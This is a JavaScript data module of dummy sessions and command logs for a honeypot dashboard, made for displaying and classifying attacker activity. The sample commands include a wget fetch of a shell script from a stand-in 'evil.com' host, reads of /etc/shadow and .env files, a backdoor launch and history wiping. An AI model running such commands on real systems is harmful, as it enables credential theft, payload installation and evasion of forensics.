// Dummy data for the Honeypot Dashboard

export const activeSessions = [
  {
    id: "session-2913116025440",
    ip: "45.33.32.156",
    country: "Russia",
    countryCode: "RU",
    username: "admin",
    skillLevel: "High",
    riskLevel: "Critical",
    startTime: "2026-02-04T17:40:11Z",
    status: "Active",
    commandCount: 24,
    lastCommand: "cat /etc/shadow"
  },
  {
    id: "session-1860929883072",
    ip: "192.168.1.100",
    country: "China",
    countryCode: "CN",
    username: "root",
    skillLevel: "Medium",
    riskLevel: "High",
    startTime: "2026-02-04T16:30:00Z",
    status: "Active",
    commandCount: 15,
    lastCommand: "wget http://evil.com/shell.sh"
  },
  {
    id: "session-7829384756123",
    ip: "103.45.67.89",
    country: "Vietnam",
    countryCode: "VN",
    username: "admin",
    skillLevel: "Low",
    riskLevel: "Medium",
    startTime: "2026-02-04T15:45:22Z",
    status: "Ended",
    commandCount: 8,
    lastCommand: "ls -la"
  },
  {
    id: "session-5648392017564",
    ip: "185.220.101.45",
    country: "Germany",
    countryCode: "DE",
    username: "devops",
    skillLevel: "High",
    riskLevel: "Critical",
    startTime: "2026-02-04T14:20:00Z",
    status: "Active",
    commandCount: 42,
    lastCommand: "nohup ./backdoor &"
  },
  {
    id: "session-9012384756890",
    ip: "23.129.64.150",
    country: "United States",
    countryCode: "US",
    username: "backup",
    skillLevel: "Medium",
    riskLevel: "Medium",
    startTime: "2026-02-04T13:10:45Z",
    status: "Ended",
    commandCount: 12,
    lastCommand: "exit"
  }
];

export const commandLogs = [
  {
    id: 1,
    sessionId: "session-2913116025440",
    timestamp: "2026-02-04T17:41:50Z",
    command: "cat /etc/shadow",
    category: "Credential Harvesting",
    intent: "Credential Harvesting",
    skillLevel: "High",
    output: "cat: /etc/shadow: Permission denied"
  },
  {
    id: 2,
    sessionId: "session-2913116025440",
    timestamp: "2026-02-04T17:41:30Z",
    command: "sudo -l",
    category: "Privilege Escalation",
    intent: "Privilege Escalation",
    skillLevel: "High",
    output: "User admin may run the following commands..."
  },
  {
    id: 3,
    sessionId: "session-1860929883072",
    timestamp: "2026-02-04T17:40:15Z",
    command: "wget http://evil.com/shell.sh",
    category: "Exfiltration",
    intent: "Tool Download",
    skillLevel: "Medium",
    output: "Saving to: 'shell.sh'"
  },
  {
    id: 4,
    sessionId: "session-2913116025440",
    timestamp: "2026-02-04T17:39:50Z",
    command: "find / -name '*.env' 2>/dev/null",
    category: "Recon",
    intent: "Secret Discovery",
    skillLevel: "High",
    output: "/home/admin/.env\n/var/www/app/.env"
  },
  {
    id: 5,
    sessionId: "session-5648392017564",
    timestamp: "2026-02-04T17:38:20Z",
    command: "nohup ./backdoor &",
    category: "Persistence",
    intent: "Persistence",
    skillLevel: "High",
    output: "nohup: appending output to 'nohup.out'"
  },
  {
    id: 6,
    sessionId: "session-1860929883072",
    timestamp: "2026-02-04T17:37:00Z",
    command: "unset HISTFILE",
    category: "Anti-Forensics",
    intent: "Anti-Forensics",
    skillLevel: "Medium",
    output: ""
  },
  {
    id: 7,
    sessionId: "session-7829384756123",
    timestamp: "2026-02-04T17:35:30Z",
    command: "ls -la /home",
    category: "Recon",
    intent: "Reconnaissance",
    skillLevel: "Low",
    output: "drwxr-xr-x admin admin ..."
  },
  {
    id: 8,
    sessionId: "session-2913116025440",
    timestamp: "2026-02-04T17:34:00Z",
    command: "cat /home/admin/.env",
    category: "Credential Harvesting",
    intent: "Credential Harvesting",
    skillLevel: "High",
    output: "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE..."
  }
];

export const metrics = {
  activeSessions: 3,
  totalCommands: 156,
  highRiskActions: 24,
  avgSessionDuration: "18m 42s"
};

export const commandFrequency = [
  { name: "ls", count: 45, category: "Recon" },
  { name: "cat", count: 32, category: "Recon" },
  { name: "cd", count: 28, category: "Navigation" },
  { name: "wget", count: 15, category: "Download" },
  { name: "sudo", count: 12, category: "PrivEsc" },
  { name: "find", count: 10, category: "Recon" },
  { name: "grep", count: 8, category: "Recon" },
  { name: "curl", count: 6, category: "Download" }
];

export const riskDistribution = [
  { name: "Critical", value: 15, color: "#ef4444" },
  { name: "High", value: 25, color: "#f97316" },
  { name: "Medium", value: 35, color: "#eab308" },
  { name: "Low", value: 25, color: "#22c55e" }
];

export const skillDistribution = [
  { name: "High", value: 30, color: "#ef4444" },
  { name: "Medium", value: 45, color: "#f97316" },
  { name: "Low", value: 25, color: "#22c55e" }
];

export const timelineData = [
  { time: "12:00", commands: 5 },
  { time: "13:00", commands: 12 },
  { time: "14:00", commands: 8 },
  { time: "15:00", commands: 25 },
  { time: "16:00", commands: 18 },
  { time: "17:00", commands: 45 },
  { time: "18:00", commands: 32 }
];

export const sessionReplayData = [
  { timestamp: 0, command: "ssh admin@prod-db-01", output: "Welcome to Ubuntu 20.04.6 LTS..." },
  { timestamp: 2000, command: "ls -la", output: "total 32\ndrwxr-xr-x admin admin notes.txt\ndrwxr-xr-x admin admin deploy.sh" },
  { timestamp: 4500, command: "cat notes.txt", output: "TODO:\n- Rotate API keys for AWS (URGENT!)\n- Check backup integrity" },
  { timestamp: 7000, command: "cat .env", output: "DB_HOST=localhost\nDB_USER=db_admin\nDB_PASS=Pr0d_S3cur3_2024!" },
  { timestamp: 10000, command: "sudo -l", output: "User admin may run the following commands:\n    (ALL : ALL) NOPASSWD: ALL" },
  { timestamp: 13000, command: "cat /etc/shadow", output: "cat: /etc/shadow: Permission denied" },
  { timestamp: 15000, command: "wget http://evil.com/shell.sh", output: "Saving to: 'shell.sh'" },
  { timestamp: 18000, command: "exit", output: "logout" }
];
